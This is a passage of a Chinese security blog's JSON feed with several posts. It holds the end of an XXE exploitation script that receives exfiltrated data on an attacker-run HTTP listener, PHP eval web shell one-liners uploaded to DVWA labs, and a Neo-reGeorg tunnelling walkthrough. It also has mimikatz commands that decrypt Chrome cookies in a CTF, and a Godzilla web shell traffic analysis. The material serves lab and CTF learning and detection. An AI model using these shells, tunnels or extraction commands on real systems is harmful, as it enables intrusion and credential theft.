MyHandler(SimpleHTTPRequestHandler):</span><br><span class=\"line\">    def log_message(self, format, *args):</span><br><span class=\"line\">        # 终端输出HTTP访问信息</span><br><span class=\"line\">        sys.stderr.write(&quot;%s - - [%s] %s\\n&quot; % (self.client_address[0], self.log_data_time_string(), format % args))</span><br><span class=\"line\">        # 保存信息到文件</span><br><span class=\"line\">        textFile = open(&quot;result.txt&quot;, &quot;a&quot;)</span><br><span class=\"line\">        textFile.write(&quot;%s - - [%s] %s\\n&quot; % (</span><br><span class=\"line\">        self.client_address[0], self.client_address[0], self.log_data_time_string(), format % args))</span><br><span class=\"line\">        textFile.close()</span><br></pre></td></tr></table></figure>\n<p>编写主函数，在其中进行相关变量的定义以及函数的调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    # 本机IP</span><br><span class=\"line\">    lip = &quot;IP&quot;</span><br><span class=\"line\">    # 本机HTTP监听端口</span><br><span class=\"line\">    lport = port</span><br><span class=\"line\">    # 目标网站提交表单的URL</span><br><span class=\"line\">    url = &quot;http://IP/xxe-lab/php_xxe/doLogin.php&quot;</span><br><span class=\"line\">    # 创建payload文件</span><br><span class=\"line\">    ExportPayload(lip, lport)</span><br><span class=\"line\">    # HTTP服务线程</span><br><span class=\"line\">    threadHTTP = threading.Thread(target=StartHTTP, args=(lip, lport))</span><br><span class=\"line\">    threadHTTP.start()</span><br><span class=\"line\">    # 发送POST数据线程</span><br><span class=\"line\">    threadPOST = threading.Thread(target=SendData, args=(lip, lport，url))</span><br><span class=\"line\">    threadPOST.start()</span><br></pre></td></tr></table></figure>\n<p><strong>防御策略</strong></p>\n<blockquote>\n<p>XXE 的危害不仅在于攻击服务器，还能通过 XXE 进行内网的端口探测以及攻击内网网站等<br>\n防御方式：</p>\n</blockquote>\n<p>1. 默认禁止外部实体的解析</p>\n<p>2. 对用户提交的 XML 数据进行过滤，如关键词 &lt;!DOCTYPE 和 &lt;!ENTITY 或者 SYSTEM 和 PUBLIC 等</p>\n",
            "tags": [
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E6%B5%85%E6%9E%90%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%9A%84%E6%90%AD%E5%BB%BA/",
            "url": "https://nnnpc.github.io/2024/04/16/%E6%B5%85%E6%9E%90%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%9A%84%E6%90%AD%E5%BB%BA/",
            "title": "浅析内网代理的搭建",
            "date_published": "2024-04-16T05:58:19.053Z",
            "content_html": "<p>工具：Neo-reGeorg</p>\n<p>这段时间打了一个渗透赛，也是通过这次机会向独奏师傅学习到了好多东西</p>\n<p>在这里先简单记录一下</p>\n<p>首先内网代理搭建就是为了让内网能够被自己的机子正常访问服务</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/306zpHzXyILqO3mf.jpg!thumbnail\" alt=\"\"></p>\n<p>这里附上一副图，cms-phpok 便是代表的使外网的机子，而后面的 solr 代表的便是内网的机子，在外网没有 getshell，没有搭建代理，是无法正常访问内网的机子的，因此在这里记录一下 getshell 之后搭建内网代理的过程</p>\n<p>首先先拿到一台有 web 服务的服务器，这里简单一些就直接拿一台部署过 dvwa 靶场的服务器来做示例了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IZ4Jr7evru8QPAQ4.png!thumbnail\" alt=\"\"></p>\n<p>首先先正常登录，找到上传点，上传一句话木马</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?= @eval($_POST&#123;&#x27;a&#x27;&#125;);?&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cVoUo74iMEloeN0B.png!thumbnail\" alt=\"\"></p>\n<p>使用蚁剑 getshell</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8QMV9I5CChjCcZG0.png!thumbnail\" alt=\"\"></p>\n<p>然后我们能在根目录看到有个 tmp 目录，有个小 tips 就是可以在这里上传扫描工具，比如 fscan 什么的，就能实现在它的机子上扫描内网 ip 了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Pb4lRT2DAFnAOhBF.png!thumbnail\" alt=\"\"></p>\n<p>我这里上传了一个 fscan 作为示例，内网地址的话本次的比赛是给了，但是也可以自己找，一种方法就是在虚拟终端 ip<br>\naddr 查看</p>\n<p>还有一种方法以这台机子为例</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QczlTQbb1iudJYdV.png!thumbnail\" alt=\"\"></p>\n<p>进入根目录下发现使用 docker 搭建的，那么直接 cat<br>\n/etc/hosts，也能够找到内网的 ip</p>\n<p>这里就不展示了，接下来讲述内网代理的搭建工具 Neo-reGeorg</p>\n<p>首先在原先上传马的目录先上传工具 Neo-reGeorg\\neoreg_servers 目录下的 tunnel.php，接着打开自己的终端运行 python 工具脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 neoreg.py -k key -u ip/目录/tunnel.php</span><br></pre></td></tr></table></figure>\n<p>-k 代表的是 key，可以去 Neo-reGeorg\\neoreg_servers 目录下的 key.txt 查看<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7zlxNRpWUs98OOEk.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>接着在自己的浏览器使用 SwitchyOmega 使用 SOCKS5 协议</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/q8JFmBf9ygpojSpH.png!thumbnail\" alt=\"\"></p>\n<p>点击应用即可，再在浏览器右上角将代理切换至刚才配置好的自己设置的名称，就会发现自己的 ip 已经切换至目标机子的服务器，就能够正常访问内网了</p>\n",
            "tags": [
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E8%BD%AC%E6%8D%A2/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E8%BD%AC%E6%8D%A2/",
            "title": "可执行文件的转换",
            "date_published": "2024-04-16T05:58:19.050Z",
            "content_html": "<blockquote>\n<p>当开发者向普通用户分享程序时，为了方便用户在未安装 Python 环境的情况下能够正常运行，需要将开发好的程序进行打包，转换成用户可运行的文件类型。<br>\nPyInstaller 是常见的执行文件打包工具。该工具的安装方式十分简单，可运行在 Windows、MacOS<br>\nX 和 GUN/Linux 操作系统环境中，支持 Python2 和 Python3 两种版本，并且在不同的操作系统环境中，PyInstaller 工具的使用方法和选项相同。<br>\n需要注意的是，用 PyInstaller 打包的执行文件，只能在与执行打包操作的系统类型相同的环境下运行。也就是说这样的执行文件不具备可移植性，比如在 Windows 系统下用 PyInstaller 生成的执行文件只能运行在 Windows 环境，在 Linux 系统下生成的执行文件只能运行在 Linux 环境。<br>\n总的来说：虽然在不同的操作系统下 PyInstaller 工具的使用方法和选项相同，但是在哪一个操作系统下执行打包操作，该生成的执行文件就只能在该系统环境下运行</p>\n</blockquote>\n<p><strong>1. 在 Windows 系统下转换</strong></p>\n<p>首先从官方网站（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L3B5aW5zdGFsbGVyLw==\">https://pypi.org/project/pyinstaller</span>）下载 PyInstaller 的安装包，将下载好的 PyInstaller 压缩包文件进行解压</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/oSQ0R0uZ8SqxgcUr.png!thumbnail\" alt=\"\"></p>\n<p>解压好的文件夹下包含 setup.py 文件。可通过执行如下命令对 PyInstaller 进行安装</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8vBFPWjTx3Jk4BM7.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 setup.py install</span><br></pre></td></tr></table></figure>\n<p>但是可能会出现一些报错，可以尝试以下 pip install<br>\npyinstaller，当然如果还是报错的话可以下载 whl 文件，如图</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/chJfo7BxMzzpbZNT.png!thumbnail\" alt=\"\"></p>\n<p>再用命令进行安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install pyinstaller-5.7.0-py3-none-win_amd64.whl</span><br></pre></td></tr></table></figure>\n<p>安装完成之后就是进行打包了，准备好需要打包的文件和需要绑定的图标，图标需为.ico 后缀。将两个文件放入同一个文件夹中，再在该路径下开启 cmd 运行命令进行打包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pyinstaller -F -i cat.ico encode.py</span><br></pre></td></tr></table></figure>\n<p>执行效果：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/iGVf6dyGN2TARGE3.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>执行之后的文件可以在 dist 文件夹中找到</p>\n<p><strong>2. 在 Linux 系统下的转换</strong></p>\n<p>这里使用 Ubuntu 进行演示，使用命令进行安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install pyinstaller</span><br></pre></td></tr></table></figure>\n<p>安装完成后执行打包操作（同样需要找到一个指定目录，这里就直接在桌面上执行打包，生成的目录也自然就在桌面上了）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pyinstaller -F encode.py</span><br></pre></td></tr></table></figure>\n<p>执行效果：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZIcJGnoZbtMpuZ0O.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>成功之后同样可以在 dist 目录中找到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lmJYorSCSkYKOHKJ.png!thumbnail\" alt=\"\"></p>\n<p>pyinstaller 安装方法挺多的，如果遇到一些比较难解决的报错可以尝试换一种方法进行下载，本人 windows 下载就是用 whl 文件，linux 是直接 pip 就可以了</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "title": "关于TCP与UDP协议的学习",
            "date_published": "2024-04-16T05:58:19.049Z",
            "content_html": "<p>TCP 协议的三次握手，传输确认，四次挥手</p>\n<hr>\n<h2 id=\"一tcp三次握手\"><a class=\"markdownIt-Anchor\" href=\"#一tcp三次握手\">#</a> 一.TCP 三次握手</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mcwMZ9QmuxvnWDoH.png!thumbnail\" alt=\"\"></p>\n<p>刚开始由客户端 1 发送给服务端 2<br>\nSYN 包，询问服务端是否能与其建立练接。服务端同意后回了<br>\n SYN+ACK 包给客户端 3，客户端 3 再回 ACK 包给服务端 4，三次握手建立，连接成功。</p>\n<h2 id=\"二传输确认\"><a class=\"markdownIt-Anchor\" href=\"#二传输确认\">#</a> 二。传输确认</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">个人理解认为，传输确认这一步骤很大原因是为了防止丢包，保证TCP协议的稳定可靠性。</span><br></pre></td></tr></table></figure>\n<p><strong>发送缓冲区：0 1 2 3 4 5 6 7 8 9 10 11 12</strong></p>\n<p><strong>发送报文：序列号 + 长度 + 发送缓冲区中的数据内容</strong></p>\n<p><strong>回复确认：ACK = 序列号 + 长度 = 下一包的起始序列号</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">由三次握手可以确认客户端与服务端传输的是同一次的包，防止丢包现象的发生，同时也因为拥有数据内容，客户端也可以传输数据片段给服务端，服务端再根据数据片段重新拼装成完整的数据内容。（同时这也可以让服务端确认缺失了哪一段数据，要求客户端重新发送）</span><br></pre></td></tr></table></figure>\n<h2 id=\"三四次挥手\"><a class=\"markdownIt-Anchor\" href=\"#三四次挥手\">#</a> 三。四次挥手</h2>\n<p>ps：客户端与服务端都可以发起关闭请求</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QaD478U79fT9rvRF.png!thumbnail\" alt=\"\"></p>\n<p>四次挥手流程：</p>\n<p>1-&gt;2：客户端向服务端发送了 FIN 包然后进入了 3（终止等待 1 状态）</p>\n<p>2-&gt;3：服务端回了 ACK 包给 3 后进入了 4（关闭等待状态），而 3 收到了 ACK 包以后进入了 5（终止等待 2 状态）</p>\n<p>（此时服务端还能发送数据，客户端还能接收数据，待数据传输完成后开始下一步。）</p>\n<p>4-&gt;5：确认传输完成后 4 会向 5 发送 FIN 包，然后进入 6（最后的确认状态）</p>\n<p>5-&gt;6：5 收到来自 4 的 FIN 包以后会向 6 发送 ACK 包，然后进入超时等待状态</p>\n<p>6-&gt;8：当 6 收到来自 5 的 ACK 包后会立马进入 8（也就是立马关闭）</p>\n<p>7-&gt;9：经过超时时间后会自动关闭也就是 7-&gt;9</p>\n<p><strong>ps：为什么要有超时等待状态：</strong></p>\n<p><strong>（一句话概括就是为了确保服务端关闭）</strong></p>\n<p><strong>详：是为了确认服务端收到 ACK 包（如不等待且服务端没有收到 ACK 包，那么服务端就会停留在最后的确认状态）。等待时，如服务端未收到 ACK 包，那么就会重复 4-&gt;5，服务端重新发送 FIN 包，而客户端收到后也就会重新发送 ACK 包（超时等待时间也会被重新刷新）。</strong></p>\n<h2 id=\"udp协议非连接\"><a class=\"markdownIt-Anchor\" href=\"#udp协议非连接\">#</a> UDP 协议（非连接）</h2>\n<p>简单封装数据包并从网卡发出，数据包间无状态上的联系</p>\n<p>因此推出 UDP 的特征：1. 性能损耗少 2. 资源占用少 3. 稳定性弱</p>\n<hr>\n<p><strong>TCP 与 UDP 差异：</strong></p>\n<p><strong>1.TCP 面向连接，UDP 面向报文</strong></p>\n<p><strong>2.TCP 对系统资源要求较多，UDP 结构相对简单</strong></p>\n<p><strong>3.TCP 稳定可靠，UDP 传输数据快</strong></p>\n<p>TCP 用于传输文件，发送邮件，浏览网页等</p>\n<p>（用于对传输质量要求较高的地方）</p>\n<p>UDP 用于域名查询，语音通话，视频直播等</p>\n<p>还可以用于隧道网络：VPN，VXLAN</p>\n<p>（用于对速度要求高，但是对少量丢包没有太大要求的场景）</p>\n",
            "tags": [
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%8F%A4%E5%89%91%E5%B1%B1%20Misc/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%8F%A4%E5%89%91%E5%B1%B1%20Misc/",
            "title": "古剑山 Misc",
            "date_published": "2024-04-16T05:58:19.047Z",
            "content_html": "<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"i-have-the-flag\"><a class=\"markdownIt-Anchor\" href=\"#i-have-the-flag\">#</a> i have the flag</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208131607810.png\" alt=\"\"></p>\n<p>附件得到 js 文件和 html，分析 js 代码和前端代码的关系</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208131905062.png\" alt=\"\"></p>\n<p>html 中调用了 checkToken 函数</p>\n<p>js 代码中的 checkToken 是这么写的</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132018245.png\" alt=\"\"></p>\n<p>但是直接进行校验明显不对</p>\n<p>发现 ic 是判断条件，需要跟踪寻找 ic</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132209608.png\" alt=\"\"></p>\n<p>直接写脚本逆向即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key1=[118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54]</span><br><span class=\"line\">token=&quot;&quot;</span><br><span class=\"line\">for i in key1:</span><br><span class=\"line\">   token+=chr(i-3)</span><br><span class=\"line\">print(token)</span><br></pre></td></tr></table></figure>\n<p>得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">simpleedu123</span><br></pre></td></tr></table></figure>\n<p>放入前端进行校验</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132607674.png\" alt=\"\"></p>\n<p><strong>flag{muWn9NU0H6erBN/w+C7HVg}</strong></p>\n<h3 id=\"幸运饼干\"><a class=\"markdownIt-Anchor\" href=\"#幸运饼干\">#</a> 幸运饼干</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132729310.png\" alt=\"\"></p>\n<p>得到两个文件，发现 flag.zip 被加密，且其中也有同样的 hint.jpg，直接明文爆破</p>\n<p>将 hint.jpg 用 bandzip 进行压缩之后 ARCHPR 明文爆破</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133048604.png\" alt=\"\"></p>\n<p>解压出四个文件</p>\n<p>在 admin.txt 中对 ntlm 进行解码得到 password：54231</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133453442.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133520532.png\" alt=\"\"></p>\n<p>接着根据 SID 压缩包中的 GUID 文件，利用 mimikatz 获取到 masterkey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::masterkey /in:&quot;master.key&quot; /sid:S-1-5-21-726299542-2485387390-1117163988-1001 /password:54231</span><br></pre></td></tr></table></figure>\n<p>这里的 master.key 文件就是 SID 压缩包中的文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133724082.png\" alt=\"\"></p>\n<p>得到 key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac</span><br></pre></td></tr></table></figure>\n<p>再利用 key 对 Cookies 进行 chrome 解密得到 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::chrome /in:Cookies /masterkey: 7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac /file:Cookies</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133830546.png\" alt=\"\"></p>\n<p><strong>flag{mimikatz_is_bravo_xzjc72}</strong></p>\n<h3 id=\"数独\"><a class=\"markdownIt-Anchor\" href=\"#数独\">#</a> 数独</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208134732690.png\" alt=\"\"></p>\n<p>附件得到两张图片</p>\n<p>不知道算不算非预期，gaps 算好 size 一把梭就好了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gaps --image=image.png --generations=40 --population=120 --size=70</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208134842612.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208134921583.png\" alt=\"\"></p>\n<p>按顺序拼接得到 flag</p>\n<p><strong>flag{4e4d6c332b6fe62a63afe56171fd3725}</strong></p>\n<h3 id=\"jpginside\"><a class=\"markdownIt-Anchor\" href=\"#jpginside\">#</a> jpginside</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231210104436420.png\" alt=\"\"></p>\n<p>查看文件头发现是 pyc 文件，修改后缀进行反编译</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">store = [] #数据太长已省略</span><br><span class=\"line\">key = raw_input(&#x27;Please input the key:&#x27;)</span><br><span class=\"line\">with open(&#x27;excellent.jpg&#x27;, &#x27;wb&#x27;) as jpg:</span><br><span class=\"line\">    for i in range(len(store)):</span><br><span class=\"line\">        jpg.write(chr(store[i] ^ ord(key[i % len(key)])))</span><br></pre></td></tr></table></figure>\n<p>key[i %<br>\n len (key)] 在前几位还是 key [i] 本身，可以根据异或反推出 key：rotate1234!</p>\n<p>再根据 key 推回完整的 jpg 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">store = [] #数据已省略</span><br><span class=\"line\">key = &#x27;rotate1234!&#x27;</span><br><span class=\"line\">with open(&#x27;out.jpg&#x27;, &#x27;wb&#x27;) as jpg:</span><br><span class=\"line\">    for i in range(len(store)):</span><br><span class=\"line\">        jpg.write(bytes([store[i] ^ ord(key[i % len(key)])]))</span><br></pre></td></tr></table></figure>\n<p>发现文件末尾有 zip 文件，其中头部两字节被修改</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231210112208349.png\" alt=\"\"></p>\n<p>改回 504b 手撕出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231210112320787.png\" alt=\"\"></p>\n<p>得到加密 txt，密码就是 key，得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jpek&#123;39i0jf49229fie5j33f02403hj953012&#125;</span><br></pre></td></tr></table></figure>\n<p>凯撒枚举偏移得到 flag</p>\n<p><strong>flag{39e0fb49229bea5f33b02403df953012}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%93%A5%E6%96%AF%E6%8B%89v4.01%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%93%A5%E6%96%AF%E6%8B%89v4.01%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "哥斯拉v4.01流量浅析",
            "date_published": "2024-04-16T05:58:19.045Z",
            "content_html": "<p>前段时间稍微看了下哥斯拉的一些流量相关的知识点，今天就来稍微记录一下</p>\n<p>首先我就在 NSSCTF 平台开了一个 DVWA 的靶场，用文件上传来进行说明，首先先进行哥斯拉的常规使用</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tYwSyXaBAubhQ2aj.png!thumbnail\" alt=\"\"></p>\n<p>在哥斯拉左上角点击管理 -&gt; 生成</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/trsNIZqYtmGpWpWq.png!thumbnail\" alt=\"\"></p>\n<p>在如下的两个地方选择载荷和加密器，这里就选择 php 的 eval_xor_base64</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4T7VyxuaX0P0dyju.png!thumbnail\" alt=\"\"></p>\n<p>点击生成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">eval($_POST[&quot;pass&quot;]);</span><br></pre></td></tr></table></figure>\n<p>会发现是最普通的一句话木马，接着由于靶场的最低级的限制，直接上传 php 文件<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1nWr1HheRSV0yqLd.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>在哥斯拉左上角点击目标添加</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/miphcOVjEc0gIKEg.png!thumbnail\" alt=\"\"></p>\n<p>在 URL 处填写好木马存放的位置，并将有效载荷和加密器调整为木马所对应的种类，测试连接为 success 即可添加</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TIsUGlkMcq1lhJSu.png!thumbnail\" alt=\"\"></p>\n<p>接着右键进入，就能够找到如下的命令执行界面了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nTgTAk3t7gdzh5PS.png!thumbnail\" alt=\"\"></p>\n<p>基本的使用介绍完了，接下来就自己抓取流量来进行分析</p>\n<p>使用 wireshark 进行捕获</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sp0Dnl5fE8s5wP6Z.png!thumbnail\" alt=\"\"></p>\n<p>使用 ls 和 ls / 两条命令来进行测试</p>\n<p>首先在 tcp 流 13 发现了哥斯拉的特征流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kICWJZ8g22hWD5EP.png!thumbnail\" alt=\"\"></p>\n<p>借着该流来分析一下哥斯拉的流量特征</p>\n<ol>\n<li>Cookie<br>\n 这是一个强特征，在请求包 cookie 中有一个非常明显的就是末尾带分号</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sol2NjTPk0is6yDj.png!thumbnail\" alt=\"\"></p>\n<ol>\n<li>Accept<br>\n 算一个弱特征，与之前出现过的冰蝎相似，上网搜了一下，发现其实这个也是 JDK 引入的一个特征，并不是作者自定义的 Accept</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6rVe3Oi3o4syVQu4.png!thumbnail\" alt=\"\"></p>\n<ol>\n<li>响应体<br>\n这个可以算是特征比较明显的一个点了，从代码可以看到它是把一串 32 位的 md5 字符串等量拆分后分别放在 base64 编码的前后。总体的结构便为：前 16 位 md5+base64 编码 + 后 16 位 md5</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V9vRwHft8bC2CEJ7.png!thumbnail\" alt=\"\"></p>\n<p>接下来解密一下流量看看</p>\n<p>这里使用的解密脚本是 github 上的一个 python 脚本</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dlYnJheWJ0bC93ZWJzaGVsbF9kZXRlY3Q=\">https://github.com/webraybtl/webshell_detect</span><br>\n 之前我们使用的加密体是 php_eval_xor_base64，因此请求体的构成为明文可执行代码 + 加密数据，在脚本内找到对应的解密模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 